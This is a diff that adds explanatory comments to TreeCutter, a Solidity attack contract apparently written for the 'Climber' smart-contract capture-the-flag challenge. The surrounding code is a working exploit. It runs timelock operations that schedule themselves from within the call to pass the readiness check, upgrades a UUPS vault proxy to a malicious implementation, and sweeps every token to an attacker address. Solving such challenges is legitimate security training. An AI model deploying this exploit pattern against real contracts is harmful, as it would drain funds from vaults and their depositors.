@@ -6,6 +6,12 @@ import "./ClimberVault.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
+/**
+ * @title TreeCutter
+ * @dev Contract that implements the UUPSUpgradable contract so that it can be the new malicious implementation
+ * @author Stealthyzzzz 
+ */ 
+
 
 
 contract TreeCutter is UUPSUpgradeable {
@@ -75,10 +81,12 @@ contract TreeCutter is UUPSUpgradeable {
         // schedules the needed operation to pass the .ReadyForExecution guard
         climberTimelock.execute(_targets, _values, _data, _salt);
 
+        // Finally transfer tokens to attacker, whew! This was a ride!
         IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));
 
     }
 
+    // Function the climberTimelock calls to finish the execution of calls
     function schedule() external {
 
         bytes memory sweepData = abi.encodeWithSignature("sweepFunds(address,address)", token, address(this));
@@ -107,6 +115,7 @@ contract TreeCutter is UUPSUpgradeable {
         climberTimelock.schedule(_targets, _values, _data, _salt);
     }
 
+    // Function called by the proxy after our contract is the new implementation
     function sweepFunds(address tokenAddress, address to) external payable {
         IERC20 _token = IERC20(tokenAddress);
         require(_token.transfer(to, _token.balanceOf(address(this))), "Transfer failed");
